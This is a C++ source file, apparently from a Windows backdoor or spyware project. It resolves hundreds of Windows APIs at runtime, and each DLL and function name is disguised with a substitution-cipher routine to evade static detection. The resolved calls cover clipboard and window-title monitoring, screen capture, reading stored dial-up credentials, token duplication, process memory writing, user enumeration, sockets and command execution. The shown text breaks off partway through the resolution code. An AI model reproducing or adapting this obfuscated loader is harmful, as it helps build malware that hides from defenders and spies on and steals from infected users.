// WinApi.cpp: implementation of the WinApi class.
//
//////////////////////////////////////////////////////////////////////

#include "stdafx.h"
#include "WinApi.h"

//////////////////////////////////////////////////////////////////////
// Construction/Destruction
//////////////////////////////////////////////////////////////////////

pAdjustTokenPrivileges		PAdjustTokenPrivileges=NULL;
pLookupPrivilegeValueA		PLookupPrivilegeValueA=NULL;
pOpenProcessToken			POpenProcessToken=NULL;
pOpenThreadToken			POpenThreadToken=NULL;

pGetAdaptersInfo			PGetAdaptersInfo=NULL;
pNetbios					PNetbios=NULL;
pRasEnumConnectionsA		PRasEnumConnectionsA=NULL;
pRasEnumEntriesA			PRasEnumEntriesA=NULL;
pRasGetEntryDialParamsA		PRasGetEntryDialParamsA=NULL;

pSHDeleteValueA				PSHDeleteValueA=NULL;
pSHGetValueA				PSHGetValueA=NULL;
pSHSetValueA				PSHSetValueA=NULL;

pChangeClipboardChain		PChangeClipboardChain=NULL;
pCloseClipboard				PCloseClipboard=NULL;
pGetClipboardData			PGetClipboardData=NULL;
pGetForegroundWindow		PGetForegroundWindow=NULL;
pCreateWindowExA			PCreateWindowExA=NULL;
pRegisterClassExA			PRegisterClassExA=NULL;
pSetClipboardViewer			PSetClipboardViewer=NULL;
pSendMessageA				PSendMessageA=NULL;
pGetPriorityClipboardFormat PGetPriorityClipboardFormat=NULL;
pGetWindowTextW				PGetWindowTextW=NULL;
pCloseDesktop				PCloseDesktop=NULL;
pCloseWindowStation			PCloseWindowStation=NULL;
pSetTimer					PSetTimer=NULL;
pDispatchMessageA			PDispatchMessageA=NULL;
pDefWindowProcA				PDefWindowProcA=NULL;
pTranslateMessage			PTranslateMessage=NULL;
pPostQuitMessage			PPostQuitMessage=NULL;
pGetMessageA				PGetMessageA=NULL;
pIsCharAlphaNumericA		PIsCharAlphaNumericA=NULL;

pWritePrivateProfileStringA PWritePrivateProfileStringA=NULL;
pGetPrivateProfileStringA	PGetPrivateProfileStringA=NULL;
pGetPrivateProfileIntA		PGetPrivateProfileIntA=NULL;
pGetEnvironmentVariableA	PGetEnvironmentVariableA=NULL;
pGetSystemDefaultLCID		PGetSystemDefaultLCID=NULL;
pFindFirstFileW				PFindFirstFileW=NULL;
pFindFirstFileA				PFindFirstFileA=NULL;
pFindNextFileW				PFindNextFileW=NULL;
pFindNextFileA				PFindNextFileA=NULL;
pFindClose					PFindClose=NULL;
pProcess32First				PProcess32First=NULL;
pProcess32Next				PProcess32Next=NULL;
pCreateToolhelp32Snapshot	PCreateToolhelp32Snapshot=NULL;
pGetCurrentProcess			PGetCurrentProcess=NULL;
pGetCurrentProcessId		PGetCurrentProcessId=NULL;
pGetCurrentThread			PGetCurrentThread=NULL;
pGetCurrentThreadId			PGetCurrentThreadId=NULL;
pFileTimeToLocalFileTime	PFileTimeToLocalFileTime=NULL;
pFileTimeToSystemTime		PFileTimeToSystemTime=NULL;
pGetDriveTypeA				PGetDriveTypeA=NULL;
pGetLogicalDriveStringsA	PGetLogicalDriveStringsA=NULL;
pGetDiskFreeSpaceExA		PGetDiskFreeSpaceExA=NULL;
pGetVolumeInformationA		PGetVolumeInformationA=NULL;
pGetLogicalDrives			PGetLogicalDrives=NULL;
pGetExitCodeThread			PGetExitCodeThread=NULL;
pCreateProcessA				PCreateProcessA=NULL;
pWideCharToMultiByte		PWideCharToMultiByte=NULL;
pTerminateProcess			PTerminateProcess=NULL;
pTerminateThread			PTerminateThread=NULL;
pOpenProcess				POpenProcess=NULL;
pDeviceIoControl			PDeviceIoControl=NULL;
pInterlockedCompareExchange PInterlockedCompareExchange=NULL;
plstrcpyA					PlstrcpyA=NULL;
plstrcatA					PlstrcatA=NULL;
pMoveFileExA				PMoveFileExA=NULL;
pMoveFileExW				PMoveFileExW=NULL;
pGetWindowsDirectoryA		PGetWindowsDirectoryA=NULL;
pCreateMutexA				PCreateMutexA=NULL;
pSetFileTime				PSetFileTime=NULL;
pLocalFileTimeToFileTime	PLocalFileTimeToFileTime=NULL;
pGetFileTime				PGetFileTime=NULL;
pGetFileSize				PGetFileSize=NULL;
pWriteProcessMemory			PWriteProcessMemory=NULL;
pReadProcessMemory			PReadProcessMemory=NULL;
pGlobalUnlock				PGlobalUnlock=NULL;
pMultiByteToWideChar		PMultiByteToWideChar=NULL;
pGlobalLock					PGlobalLock=NULL;
pGetSystemDirectoryA		PGetSystemDirectoryA=NULL;
pGetVersionExA				PGetVersionExA=NULL;
pGetFileAttributesA			PGetFileAttributesA=NULL;
pDeleteFileA				PDeleteFileA=NULL;
pDeleteFileW				PDeleteFileW=NULL;
pGlobalAlloc				PGlobalAlloc=NULL;
pCreateFileA				PCreateFileA=NULL;
pCreateFileW				PCreateFileW=NULL;
pLocalAlloc					PLocalAlloc=NULL;
pCreatePipe					PCreatePipe=NULL;
pFreeResource				PFreeResource=NULL;
pCopyFileA					PCopyFileA=NULL;
pCopyFileW					PCopyFileW=NULL;
pLoadResource				PLoadResource=NULL;
pIsWow64Process				PIsWow64Process = NULL;

//GDI32.DLL
pGetPixel					PGetPixel=NULL;
pDeleteDC					PDeleteDC=NULL;
pDeleteObject				PDeleteObject=NULL;
pGetDIBits					PGetDIBits=NULL;
pRealizePalette				PRealizePalette=NULL;
pSelectPalette				PSelectPalette=NULL;
pGetStockObject				PGetStockObject=NULL;
pGetDeviceCaps				PGetDeviceCaps=NULL;
pBitBlt						PBitBlt=NULL;
pSelectObject				PSelectObject=NULL;
pCreateDCA					PCreateDCA=NULL;
pCreateCompatibleDC			PCreateCompatibleDC=NULL;
pCreateCompatibleBitmap		PCreateCompatibleBitmap=NULL;

pSHGetPathFromIDListW		PSHGetPathFromIDListW=NULL;
pSHGetSpecialFolderLocation PSHGetSpecialFolderLocation=NULL;
pSHGetSpecialFolderPathA	PSHGetSpecialFolderPathA=NULL;
pSHGetSpecialFolderPathW	PSHGetSpecialFolderPathW=NULL;

pNetApiBufferFree			PNetApiBufferFree=NULL;
pNetUserEnum				PNetUserEnum=NULL;

pCoCreateInstance			PCoCreateInstance=NULL;
pCoUninitialize				PCoUninitialize = NULL;
pCoInitialize				PCoInitialize = NULL;
pCLSIDFromProgID			PCLSIDFromProgID = NULL;

pSetupDiCallClassInstaller	PSetupDiCallClassInstaller=NULL;
pSetupDiDestroyDeviceInfoList PSetupDiDestroyDeviceInfoList=NULL;
pSetupDiEnumDeviceInfo		PSetupDiEnumDeviceInfo=NULL;
pSetupDiGetClassDevsA		PSetupDiGetClassDevsA=NULL;
pSetupDiGetDeviceRegistryPropertyA	PSetupDiGetDeviceRegistryPropertyA=NULL;
pSetupDiSetClassInstallParamsA PSetupDiSetClassInstallParamsA=NULL;
pSetupDiEnumDeviceInterfaces PSetupDiEnumDeviceInterfaces = NULL;
pSetupDiGetDeviceInterfaceDetailA PSetupDiGetDeviceInterfaceDetailA = NULL;

pSendTo PSendTo = NULL;
pgethostbyname Pgethostbyname = NULL;
psocket Psocket = NULL;
precvfrom Precvfrom = NULL;
pinet_addr Pinet_addr = NULL;
pWindExec PWindExec = NULL;

pRegCloseKey PRegCloseKey = NULL;
pRegQueryValueExW PRegQueryValueExW = NULL;
pRegQueryValueExA PRegQueryValueExA = NULL;
pRegOpenKeyExW PRegOpenKeyExW = NULL;
pRegOpenKeyExA PRegOpenKeyExA = NULL;
pRegSetValueExA PRegSetValueExA = NULL;
pRegEnumValueA PRegEnumValueA = NULL;
pRegEnumValueW PRegEnumValueW = NULL;
pRegDeleteValueW PRegDeleteValueW = NULL;
pRegDeleteValueA PRegDeleteValueA = NULL;
pRegCreateKeyExA PRegCreateKeyExA = NULL;
pRegEnumKeyExA PRegEnumKeyExA = NULL;
pRegQueryInfoKeyA PRegQueryInfoKeyA = NULL;
pRegEnumKeyA PRegEnumKeyA = NULL;
pRegOpenKeyA PRegOpenKeyA = NULL;
pRegConnectRegistryA PRegConnectRegistryA = NULL;
pInternetOpenA PInternetOpenA = NULL;
pInternetReadFile PInternetReadFile = NULL;
pInternetCloseHandle PInternetCloseHandle = NULL;
pInternetOpenUrlA PInternetOpenUrlA = NULL;
pOpenClipboard POpenClipboard = NULL;

pGetThreadDesktop PGetThreadDesktop = NULL;
pCreateProcessW PCreateProcessW = NULL;
pProcess32FirstW PProcess32FirstW = NULL;
pProcess32NextW PProcess32NextW = NULL;

pGetTempPathA PGetTempPathA = NULL;
pGetTempPathW PGetTempPathW = NULL;

pWTSEnumerateSessionsA PWTSEnumerateSessionsA = NULL;

pCreateEnvironmentBlock PCreateEnvironmentBlock = NULL;
pDestroyEnvironmentBlock PDestroyEnvironmentBlock = NULL;

pCreateProcessAsUserW PCreateProcessAsUserW = NULL;
pDuplicateTokenEx PDuplicateTokenEx = NULL;
pGetTokenInformation PGetTokenInformation = NULL;

pGetLocalTime PGetLocalTime = NULL;

pGetStartupInfoA PGetStartupInfoA = NULL;
pGetFileSizeEx PGetFileSizeEx = NULL;

pReleaseDC PReleaseDC = NULL;
pGetDC PGetDC = NULL;

pNtQueryInformationProcess PNtQueryInformationProcess = NULL;
pNtWow64QueryInformationProcess64 PNtWow64QueryInformationProcess64 = NULL;
pNtReadVirtualMemory PNtReadVirtualMemory = NULL;
pNtWow64ReadVirtualMemory64 PNtWow64ReadVirtualMemory64 = NULL;
pGetModuleFileNameA PGetModuleFileNameA = NULL;
pGetModuleFileNameW PGetModuleFileNameW = NULL;
pShellExecuteA PShellExecuteA = NULL;

pWTSQueryUserToken PWTSQueryUserToken = NULL;
pWTSFreeMemory PWTSFreeMemory = NULL;

pWSAStartup PWSAStartup = NULL;
pntohl Pntohl = NULL;
phtonl Phtonl = NULL;
phtons Phtons = NULL;
precv Precv = NULL;
psend Psend = NULL;
pconnect Pconnect = NULL;
pinet_ntoa Pinet_ntoa = NULL;
pgethostbyaddr Pgethostbyaddr = NULL;
pgetprotobyname Pgetprotobyname = NULL;
psetsockopt Psetsockopt = NULL;
pWSAGetLastError PWSAGetLastError = NULL;

//
pGetFileVersionInfoA PGetFileVersionInfoA = NULL;
pGetFileVersionInfoSizeA PGetFileVersionInfoSizeA = NULL;
pVerQueryValueA PVerQueryValueA = NULL;

pOpenDesktopA POpenDesktopA = NULL;

pSetFileAttributesA PSetFileAttributesA = NULL;
pSetFileAttributesW PSetFileAttributesW = NULL;

plstrlenA PlstrlenA = NULL;

pSetThreadDesktop PSetThreadDesktop = NULL;
pSetProcessWindowStation PSetProcessWindowStation = NULL;
pGetProcessWindowStation PGetProcessWindowStation = NULL;
pOpenWindowStationA POpenWindowStationA = NULL;

pSHGetMalloc PSHGetMalloc = NULL;
pSHGetDesktopFolder PSHGetDesktopFolder = NULL;

pSysAllocString PSysAllocString = NULL;
pSysFreeString PSysFreeString = NULL;

pGetObjectA PGetObjectA = NULL;
pStretchBlt PStretchBlt = NULL;

pReadFile PReadFile = NULL;
pWriteFile PWriteFile = NULL;
pSystemTimeToFileTime PSystemTimeToFileTime = NULL;
pProcessIdToSessionId PProcessIdToSessionId = NULL;
pInterlockedExchange PInterlockedExchange = NULL;
pInterlockedDecrement PInterlockedDecrement = NULL;
pGetComputerNameW PGetComputerNameW = NULL;
pInterlockedIncrement PInterlockedIncrement = NULL;
pSetFilePointerEx PSetFilePointerEx = NULL;
pGetTickCount PGetTickCount = NULL;
pSleep PSleep = NULL;
pLocalFree PLocalFree = NULL;
pGlobalFree PGlobalFree = NULL;
pGetLastError PGetLastError = NULL;
pOutputDebugStringA POutputDebugStringA = NULL;

pSendARP PSendARP = NULL;

//rptBAcdE2.qMRIUJo5wK6GsVNFfbajXgx4YZS7emy0CzD91LlWiv3Ou
#define ALPHABET_LEN 55
char *DeobStringA(char *ret_string, int strlen, char *string)
{
	char alphabet[ALPHABET_LEN]={'r','p','t','B','A','c','d','E','2','.',
		'q','M','R','I','U','J','o','5','w','K',
		'6','G','s','V','N','F','f','b','a','j',
		'X','g','x','4','Y','Z','S','7','e','m',
		'y','0','C','z','D','9','1','L','l','W',
		'i','v','3','O','u'};
	DWORD i,j, scramble=8;
	_snprintf(ret_string, strlen, "%s", string);
	for (i=0; ret_string[i]; i++) {
		for (j=0; j<ALPHABET_LEN; j++)
			if (ret_string[i] == alphabet[j]) {
				ret_string[i] = alphabet[(j+scramble)%ALPHABET_LEN];
				break;
			}
	}
	return ret_string;
}

void GetNTProcesspFun()
{
	char TmpDeStr[50];
	//GetLoadFun(NULL);

	HMODULE handle = LoadLibraryA(DeobStringA(TmpDeStr, 50, "vOz6lCDrpOyy"));//Advapi32.dll
	if(handle)
	{
		PAdjustTokenPrivileges=(pAdjustTokenPrivileges)GetProcAddress(handle, DeobStringA(TmpDeStr, 50, "vOG1UWT2kXnPLCzCyXVXU"));//AdjustTokenPrivileges
		PLookupPrivilegeValueA=(pLookupPrivilegeValueA)GetProcAddress(handle, DeobStringA(TmpDeStr, 50, "m22k1lPLCzCyXVXJ6y1Xv"));//LookupPrivilegeValueA
		POpenProcessToken=(pOpenProcessToken)GetProcAddress(handle, DeobStringA(TmpDeStr, 50, "9lXnPL23XUUT2kXn"));//OpenProcessToken
		POpenThreadToken=(pOpenThreadToken)GetProcAddress(handle, DeobStringA(TmpDeStr, 50, "9lXnThLX6OT2kXn"));//OpenThreadToken
		PRegCloseKey=(pRegCloseKey)GetProcAddress(handle, DeobStringA(TmpDeStr, 50, "AXVYy2UXMXx"));//RegCloseKey
		PRegQueryValueExA=(pRegQueryValueExA)GetProcAddress(handle, DeobStringA(TmpDeStr, 50, "AXVQ1XLxJ6y1XuNv"));//RegQueryValueExA
		PRegQueryValueExW=(pRegQueryValueExW)GetProcAddress(handle, DeobStringA(TmpDeStr, 50, "AXVQ1XLxJ6y1XuN0"));//RegQueryValueExW
		PRegOpenKeyExA=(pRegOpenKeyExA)GetProcAddress(handle, DeobStringA(TmpDeStr, 50, "AXV9lXnMXxuNv"));//RegOpenKeyExA
		PRegOpenKeyExW=(pRegOpenKeyExW)GetProcAddress(handle, DeobStringA(TmpDeStr, 50, "AXV9lXnMXxuN0"));//RegOpenKeyExW
		PRegSetValueExA=(pRegSetValueExA)GetProcAddress(handle, DeobStringA(TmpDeStr, 50, "AXVaXWJ6y1XuNv"));//RegSetValueExA
		PRegEnumValueA=(pRegEnumValueA)GetProcAddress(handle, DeobStringA(TmpDeStr, 50, "AXVun1gJ6y1Xv"));//RegEnumValueA
		PRegEnumValueW=(pRegEnumValueW)GetProcAddress(handle, DeobStringA(TmpDeStr, 50, "AXVun1gJ6y1X0"));//RegEnumValueW
		PRegDeleteValueW=(pRegDeleteValueW)GetProcAddress(handle, DeobStringA(TmpDeStr, 50, "AXVSXyXWXJ6y1X0"));//RegDeleteValueW
		PRegCreateKeyExA=(pRegCreateKeyExA)GetProcAddress(handle, DeobStringA(TmpDeStr, 50, "AXVYLX6WXMXxuNv"));//RegCreateKeyExA
		PRegEnumKeyExA=(pRegEnumKeyExA)GetProcAddress(handle, DeobStringA(TmpDeStr, 50, "AXVun1gMXxuNv"));//RegEnumKeyExA
		PRegQueryInfoKeyA=(pRegQueryInfoKeyA)GetProcAddress(handle, DeobStringA(TmpDeStr, 50, "AXVQ1XLxcnw2MXxv"));//RegQueryInfoKeyA
		PCreateProcessAsUserW=(pCreateProcessAsUserW)GetProcAddress(handle, DeobStringA(TmpDeStr, 50, "YLX6WXPL23XUUvUdUXL0"));//CreateProcessAsUserW
		PDuplicateTokenEx=(pDuplicateTokenEx)GetProcAddress(handle, DeobStringA(TmpDeStr, 50, "S1lyC36WXT2kXnuN"));//DuplicateTokenEx
		PGetTokenInformation=(pGetTokenInformation)GetProcAddress(handle, DeobStringA(TmpDeStr, 50, "IXWT2kXncnw2Lg6WC2n"));//GetTokenInformation
		PRegDeleteValueA=(pRegDeleteValueA)GetProcAddress(handle, DeobStringA(TmpDeStr, 50, "AXVSXyXWXJ6y1Xv"));//RegDeleteValueA
		PRegEnumKeyA=(pRegEnumKeyA)GetProcAddress(handle, DeobStringA(TmpDeStr, 50, "AXVun1gMXxv"));//RegEnumKeyA
		PRegOpenKeyA=(pRegOpenKeyA)GetProcAddress(handle, DeobStringA(TmpDeStr, 50, "AXV9lXnMXxv"));//RegOpenKeyA
		PRegConnectRegistryA=(pRegConnectRegistryA)GetProcAddress(handle, DeobStringA(TmpDeStr, 50, "AXVY2nnX3WAXVCUWLxv"));//RegConnectRegistryA

		handle = NULL;
	}
	handle = LoadLibraryA(DeobStringA(TmpDeStr, 50, "kXLnXyDrpOyy"));//kernel32.dll
	if(handle)
	{
		PWritePrivateProfileStringA=(pWritePrivateProfileStringA)GetProcAddress(handle, DeobStringA(TmpDeStr, 50, "0LCWXPLCz6WXPL2wCyXaWLCnVv"));//WritePrivateProfileStringA
		PGetPrivateProfileStringA=(pGetPrivateProfileStringA)GetProcAddress(handle, DeobStringA(TmpDeStr, 50, "IXWPLCz6WXPL2wCyXaWLCnVv"));//GetPrivateProfileStringA
		PGetPrivateProfileIntA=(pGetPrivateProfileIntA)GetProcAddress(handle, DeobStringA(TmpDeStr, 50, "IXWPLCz6WXPL2wCyXcnWv"));//GetPrivateProfileIntA
		PGetEnvironmentVariableA=(pGetEnvironmentVariableA)GetProcAddress(handle, DeobStringA(TmpDeStr, 50, "IXWunzCL2ngXnWJ6LC6KyXv"));//GetEnvironmentVariableA
		PGetSystemDefaultLCID=(pGetSystemDefaultLCID)GetProcAddress(handle, DeobStringA(TmpDeStr, 50, "IXWaxUWXgSXw61yWmYcS"));//GetSystemDefaultLCID
		PFindFirstFileW=(pFindFirstFileW)GetProcAddress(handle, DeobStringA(TmpDeStr, 50, "5CnO5CLUW5CyX0"));//FindFirstFileW
		PFindFirstFileA=(pFindFirstFileA)GetProcAddress(handle, DeobStringA(TmpDeStr, 50, "5CnO5CLUW5CyXv"));//FindFirstFileA
		PFindNextFileW=(pFindNextFileW)GetProcAddress(handle, DeobStringA(TmpDeStr, 50, "5CnOoXNW5CyX0"));//FindNextFileW
		PFindNextFileA=(pFindNextFileA)GetProcAddress(handle, DeobStringA(TmpDeStr, 50, "5CnOoXNW5CyXv"));//FindNextFileA
		PFindClose=(pFindClose)GetProcAddress(handle, DeobStringA(TmpDeStr, 50, "5CnOYy2UX"));//FindClose
		PProcess32First=(pProcess32First)GetProcAddress(handle, DeobStringA(TmpDeStr, 50, "PL23XUUDr5CLUW"));//Process32First
		PProcess32Next=(pProcess32Next)GetProcAddress(handle, DeobStringA(TmpDeStr, 50, "PL23XUUDroXNW"));//Process32Next
		PCreateToolhelp32Snapshot=(pCreateToolhelp32Snapshot)GetProcAddress(handle, DeobStringA(TmpDeStr, 50, "YLX6WXT22yhXylDran6lUh2W"));//CreateToolhelp32Snapshot
		PGetCurrentProcess=(pGetCurrentProcess)GetProcAddress(handle, DeobStringA(TmpDeStr, 50, "IXWY1LLXnWPL23XUU"));//GetCurrentProcess
		PGetCurrentProcessId=(pGetCurrentProcessId)GetProcAddress(handle, DeobStringA(TmpDeStr, 50, "IXWY1LLXnWPL23XUUcO"));//GetCurrentProcessId
		PGetCurrentThread=(pGetCurrentThread)GetProcAddress(handle, DeobStringA(TmpDeStr, 50, "IXWY1LLXnWThLX6O"));//GetCurrentThread
		PGetCurrentThreadId=(pGetCurrentThreadId)GetProcAddress(handle, DeobStringA(TmpDeStr, 50, "IXWY1LLXnWThLX6OcO"));//GetCurrentThreadId
		PFileTimeToLocalFileTime=(pFileTimeToLocalFileTime)GetProcAddress(handle, DeobStringA(TmpDeStr, 50, "5CyXTCgXT2m236y5CyXTCgX"));//FileTimeToLocalFileTime
		PFileTimeToSystemTime=(pFileTimeToSystemTime)GetProcAddress(handle, DeobStringA(TmpDeStr, 50, "5CyXTCgXT2axUWXgTCgX"));//FileTimeToSystemTime
		PGetDriveTypeA=(pGetDriveTypeA)GetProcAddress(handle, DeobStringA(TmpDeStr, 50, "IXWSLCzXTxlXv"));//GetDriveTypeA
		PGetLogicalDriveStringsA=(pGetLogicalDriveStringsA)GetProcAddress(handle, DeobStringA(TmpDeStr, 50, "IXWm2VC36ySLCzXaWLCnVUv"));//GetLogicalDriveStringsA
		PGetDiskFreeSpaceExA=(pGetDiskFreeSpaceExA)GetProcAddress(handle, DeobStringA(TmpDeStr, 50, "IXWSCUk5LXXal63XuNv"));//GetDiskFreeSpaceExA
		PGetVolumeInformationA=(pGetVolumeInformationA)GetProcAddress(handle, DeobStringA(TmpDeStr, 50, "IXWJ2y1gXcnw2Lg6WC2nv"));//GetVolumeInformationA
		PGetLogicalDrives=(pGetLogicalDrives)GetProcAddress(handle, DeobStringA(TmpDeStr, 50, "IXWm2VC36ySLCzXU"));//GetLogicalDrives
		PGetExitCodeThread=(pGetExitCodeThread)GetProcAddress(handle, DeobStringA(TmpDeStr, 50, "IXWuNCWY2OXThLX6O"));//GetExitCodeThread
		PCreateProcessA=(pCreateProcessA)GetProcAddress(handle, DeobStringA(TmpDeStr, 50, "YLX6WXPL23XUUv"));//CreateProcessA
		PWideCharToMultiByte=(pWideCharToMultiByte)GetProcAddress(handle, DeobStringA(TmpDeStr, 50, "0COXYh6LT2B1yWCixWX"));//WideCharToMultiByte
		PTerminateProcess=(pTerminateProcess)GetProcAddress(handle, DeobStringA(TmpDeStr, 50, "TXLgCn6WXPL23XUU"));//TerminateProcess
		PTerminateThread=(pTerminateThread)GetProcAddress(handle, DeobStringA(TmpDeStr, 50, "TXLgCn6WXThLX6O"));//TerminateThread
		POpenProcess=(pOpenProcess)GetProcAddress(handle, DeobStringA(TmpDeStr, 50, "9lXnPL23XUU"));//OpenProcess
		PDeviceIoControl=(pDeviceIoControl)GetProcAddress(handle, DeobStringA(TmpDeStr, 50, "SXzC3Xc2Y2nWL2y"));//DeviceIoControl
		PInterlockedCompareExchange=(pInterlockedCompareExchange)GetProcAddress(handle, DeobStringA(TmpDeStr, 50, "cnWXLy23kXOY2gl6LXuN3h6nVX"));//InterlockedCompareExchange
		PlstrcpyA=(plstrcpyA)GetProcAddress(handle, DeobStringA(TmpDeStr, 50, "yUWL3lxv"));//lstrcpyA
		PlstrcatA=(plstrcatA)GetProcAddress(handle, DeobStringA(TmpDeStr, 50, "yUWL36Wv"));//lstrcatA
		PMoveFileExA=(pMoveFileExA)GetProcAddress(handle, DeobStringA(TmpDeStr, 50, "B2zX5CyXuNv"));//MoveFileExA
		PMoveFileExW=(pMoveFileExW)GetProcAddress(handle, DeobStringA(TmpDeStr, 50, "B2zX5CyXuN0"));//MoveFileExW
		PGetWindowsDirectoryA=(pGetWindowsDirectoryA)GetProcAddress(handle, DeobStringA(TmpDeStr, 50, "IXW0CnO2qUSCLX3W2Lxv"));//GetWindowsDirectoryA
		PCreateMutexA=(pCreateMutexA)GetProcAddress(handle, DeobStringA(TmpDeStr, 50, "YLX6WXB1WXNv"));//CreateMutexA
		PSetFileTime=(pSetFileTime)GetProcAddress(handle, DeobStringA(TmpDeStr, 50, "aXW5CyXTCgX"));//SetFileTime
		PLocalFileTimeToFileTime=(pLocalFileTimeToFileTime)GetProcAddress(handle, DeobStringA(TmpDeStr, 50, "m236y5CyXTCgXT25CyXTCgX"));//LocalFileTimeToFileTime
		PGetFileTime=(pGetFileTime)GetProcAddress(handle, DeobStringA(TmpDeStr, 50, "IXW5CyXTCgX"));//GetFileTime
		PGetFileSize=(pGetFileSize)GetProcAddress(handle, DeobStringA(TmpDeStr, 50, "IXW5CyXaCZX"));//GetFileSize
		PWriteProcessMemory=(pWriteProcessMemory)GetProcAddress(handle, DeobStringA(TmpDeStr, 50, "0LCWXPL23XUUBXg2Lx"));//WriteProcessMemory
		PReadProcessMemory=(pReadProcessMemory)GetProcAddress(handle, DeobStringA(TmpDeStr, 50, "AX6OPL23XUUBXg2Lx"));//ReadProcessMemory
		PGlobalUnlock=(pGlobalUnlock)GetProcAddress(handle, DeobStringA(TmpDeStr, 50, "Iy2K6ydny23k"));//GlobalUnlock
		PMultiByteToWideChar=(pMultiByteToWideChar)GetProcAddress(handle, DeobStringA(TmpDeStr, 50, "B1yWCixWXT20COXYh6L"));//MultiByteToWideChar
		PGlobalLock=(pGlobalLock)GetProcAddress(handle, DeobStringA(TmpDeStr, 50, "Iy2K6ym23k"));//GlobalLock
		PGetSystemDirectoryA=(pGetSystemDirectoryA)GetProcAddress(handle, DeobStringA(TmpDeStr, 50, "IXWaxUWXgSCLX3W2Lxv"));//GetSystemDirectoryA
		PGetVersionExA=(pGetVersionExA)GetProcAddress(handle, DeobStringA(TmpDeStr, 50, "IXWJXLUC2nuNv"));//GetVersionExA
		PGetFileAttributesA=(pGetFileAttributesA)GetProcAddress(handle, DeobStringA(TmpDeStr, 50, "IXW5CyXvWWLCK1WXUv"));//GetFileAttributesA
		PDeleteFileA=(pDeleteFileA)GetProcAddress(handle, DeobStringA(TmpDeStr, 50, "SXyXWX5CyXv"));//DeleteFileA
		PDeleteFileW=(pDeleteFileW)GetProcAddress(handle, DeobStringA(TmpDeStr, 50, "SXyXWX5CyX0"));//DeleteFileW
		PGlobalAlloc=(pGlobalAlloc)GetProcAddress(handle, DeobStringA(TmpDeStr, 50, "Iy2K6yvyy23"));//GlobalAlloc
		PCreateFileA=(pCreateFileA)GetProcAddress(handle, DeobStringA(TmpDeStr, 50, "YLX6WX5CyXv"));//CreateFileA
		PCreateFileW=(pCreateFileW)GetProcAddress(handle, DeobStringA(TmpDeStr, 50, "YLX6WX5CyX0"));//CreateFileW
		PLocalAlloc=(pLocalAlloc)GetProcAddress(handle, DeobStringA(TmpDeStr, 50, "m236yvyy23"));//LocalAlloc
		PCreatePipe=(pCreatePipe)GetProcAddress(handle, DeobStringA(TmpDeStr, 50, "YLX6WXPClX"));//CreatePipe
		PFreeResource=(pFreeResource)GetProcAddress(handle, DeobStringA(TmpDeStr, 50, "5LXXAXU21L3X"));//FreeResource
		PCopyFileA=(pCopyFileA)GetProcAddress(handle, DeobStringA(TmpDeStr, 50, "Y2lx5CyXv"));//CopyFileA
		PCopyFileW=(pCopyFileW)GetProcAddress(handle, DeobStringA(TmpDeStr, 50, "Y2lx5CyX0"));//CopyFileW
		PLoadResource=(pLoadResource)GetProcAddress(handle, DeobStringA(TmpDeStr, 50, "m26OAXU21L3X"));//LoadResource
		PWindExec = (pWindExec)GetProcAddress(handle, DeobStringA(TmpDeStr, 50, "0CnuNX3"));//WinExec
		PCreateProcessW = (pCreateProcessW)GetProcAddress(handle, DeobStringA(TmpDeStr, 50, "YLX6WXPL23XUU0"));//CreateProcessW
		PProcess32FirstW = (pProcess32FirstW)GetProcAddress(handle, DeobStringA(TmpDeStr, 50, "PL23XUUDr5CLUW0"));//Process32FirstW
		PProcess32NextW = (pProcess32NextW)GetProcAddress(handle, DeobStringA(TmpDeStr, 50, "PL23XUUDroXNW0"));//Process32NextW
		PGetTempPathA = (pGetTempPathA)GetProcAddress(handle, DeobStringA(TmpDeStr, 50, "IXWTXglP6Whv"));//GetTempPathA
		PGetTempPathW = (pGetTempPathW)GetProcAddress(handle, DeobStringA(TmpDeStr, 50, "IXWTXglP6Wh0"));//GetTempPathW
		PGetLocalTime = (pGetLocalTime)GetProcAddress(handle, DeobStringA(TmpDeStr, 50, "IXWm236yTCgX"));//GetLocalTime
		PGetStartupInfoA = (pGetStartupInfoA)GetProcAddress(handle, DeobStringA(TmpDeStr, 50, "IXWaW6LW1lcnw2v"));//GetStartupInfoA
		PGetFileSizeEx = (pGetFileSizeEx)GetProcAddress(handle, DeobStringA(TmpDeStr, 50, "IXW5CyXaCZXuN"));//GetFileSizeEx
		PIsWow64Process = (pIsWow64Process)GetProcAddress(handle, DeobStringA(TmpDeStr, 50, "cU02qRFPL23XUU")); //IsWow64Process
		PGetModuleFileNameA = (pGetModuleFileNameA)GetProcAddress(handle, DeobStringA(TmpDeStr, 50, "IXWB2O1yX5CyXo6gXv")); //GetModuleFileNameA
		PGetModuleFileNameW = (pGetModuleFileNameW)GetProcAddress(handle, DeobStringA(TmpDeStr, 50, "IXWB2O1yX5CyXo6gX0")); //GetModuleFileNameW
		PSetFileAttributesA = (pSetFileAttributesA)GetProcAddress(handle, DeobStringA(TmpDeStr, 50, "aXW5CyXvWWLCK1WXUv")); //SetFileAttributesA
		PSetFileAttributesW = (pSetFileAttributesW)GetProcAddress(handle, DeobStringA(TmpDeStr, 50, "aXW5CyXvWWLCK1WXU0")); //SetFileAttributesW
		PlstrlenA = (plstrlenA)GetProcAddress(handle, DeobStringA(TmpDeStr, 50, "yUWLyXnv")); //lstrlenA
		PReadFile = (pReadFile)GetProcAddress(handle, DeobStringA(TmpDeStr, 50, "AX6O5CyX")); //ReadFile
		PWriteFile = (pWriteFile)GetProcAddress(handle,DeobStringA(TmpDeStr, 50, "0LCWX5CyX")); //WriteFile
		PSystemTimeToFileTime = (pSystemTimeToFileTime)GetProcAddress(handle, DeobStringA(TmpDeStr, 50, "axUWXgTCgXT25CyXTCgX")); //SystemTimeToFileTime
		PProcessIdToSessionId = (pProcessIdToSessionId)GetProcAddress(handle, DeobStringA(TmpDeStr, 50, "PL23XUUcOT2aXUUC2ncO")); //ProcessIdToSessionId
		PInterlockedExchange = (pInterlockedExchange)GetProcAddress(handle, DeobStringA(TmpDeStr, 50, "cnWXLy23kXOuN3h6nVX")); //InterlockedExchange
		PInterlockedDecrement = (pInterlockedDecrement)GetProcAddress(handle, DeobStringA(TmpDeStr, 50, "cnWXLy23kXOSX3LXgXnW")); //InterlockedDecrement
		PGetComputerNameW = (pGetComputerNameW)GetProcAddress(handle, DeobStringA(TmpDeStr, 50, "IXWY2gl1WXLo6gX0")); //GetComputerNameW
		PInterlockedIncrement = (pInterlockedIncrement)GetProcAddress(handle, DeobStringA(TmpDeStr, 50, "cnWXLy23kXOcn3LXgXnW")); //InterlockedIncrement
